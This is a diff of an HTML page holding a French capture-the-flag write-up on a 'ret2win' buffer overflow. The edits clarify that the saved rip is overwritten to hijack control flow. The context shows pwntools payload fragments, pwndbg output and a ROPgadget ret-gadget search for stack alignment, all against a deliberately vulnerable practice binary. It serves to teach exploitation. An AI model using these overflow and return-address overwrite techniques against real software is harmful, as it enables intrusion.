@@ -232,7 +232,7 @@ File information # Avant de commencer à regarder dans l&amp;rsquo;executable, i
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span></code></pre></div><p>Ici, on déclare deux variables, une qui correspond au padding nécessaire pour remplir le buffer (padding), et une qui correspond au padding pour overwrite la sauvegarde de <code>rbp</code> (rbp)</p>
-<p>On envoie ensuite notre payload mais en l&rsquo;occurence ici il ne va rien se passer puisque <code>rip</code> n&rsquo;a pas été overwrite.</p>
+<p>On envoie ensuite notre payload mais en l&rsquo;occurence ici il ne va rien se passer puisque la sauvegarde de <code>rip</code> n&rsquo;a pas été overwrite.</p>
 <p>La prochaine étape est de lister les symboles de l&rsquo;executable pour trouver notre fonction &ldquo;win&rdquo; (une fonction qui va nous permettre de lire le flag). Pour faire ça, on peut utiliser <code>pwndbg</code> par exemple:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
 </span></span><span style="display:flex;"><span>	All defined functions:
@@ -276,7 +276,10 @@ File information # Avant de commencer à regarder dans l&amp;rsquo;executable, i
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>	pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x400943</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x400943</span>:	<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>
 </span></span></code></pre></div><p>Ok, donc c&rsquo;est effectivement notre fonction win, puisqu&rsquo;elle passe <code>&quot;/bin/cat flag.txt&quot;</code> en argument dans <code>system()</code>.</p>
-<p>L&rsquo;idée va donc être d&rsquo;ajouter l&rsquo;adresse de cette fonction à la fin de notre payload, pour qu&rsquo;elle finisse dans <code>rip</code> (rip est l&rsquo;instruction pointer, il pointe vers la prochaine instruction à éxecuter, qui sera en l&rsquo;occurence la fonction <code>ret2win</code>)</p>
+<p>L&rsquo;idée va donc être d&rsquo;ajouter l&rsquo;adresse de cette fonction à la fin de notre payload, pour qu&rsquo;elle finisse dans la sauvegarde de <code>rip</code></p>
+<blockquote>
+<p>La sauvegarde de <code>rip</code> contient toujours l&rsquo;adresse de la prochaine instruction à éxecuter. Ici, en réecrivant sa valeur actuelle par l&rsquo;adresse de la fonction <code>ret2win</code>, on modifie la prochaine étape du programme en lui faisant appeler une fonction qui ne devait jamais être appelée. On a donc modifié son <strong>flux d&rsquo;éxecution</strong>.</p>
+</blockquote>
 <p>On peut compléter notre exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
@@ -297,7 +300,7 @@ File information # Avant de commencer à regarder dans l&amp;rsquo;executable, i
 </span></span></code></pre></div><p>Maintenant, on lance l&rsquo;exploit et on devrait avoir le flag</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png" alt="2023-01-13-201012_1135x146_scrot"></p>
 <p>Et&hellip; le flag n&rsquo;a pas été print car le programme a <code>segfault</code>. Puisque je suis sous Ubuntu 22.04, qui est une version ultérieure à la 18.04 je suis affecté par les problèmes de <strong>stack alignment</strong> (MOVAPS)</p>
-<p>Pour régler ça, on peut ajouter un gadget <code>ret</code>, qu&rsquo;on va trouver en utilisant <code>ROPgadget</code> après notre padding</p>
+<p>Pour régler ça, on peut ajouter un gadget <code>ret</code>, qu&rsquo;on va trouver en utilisant <code>ROPgadget</code>, après notre padding</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary ret2win <span style="color:#f92672">|</span> grep ret
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040053e</span> : ret
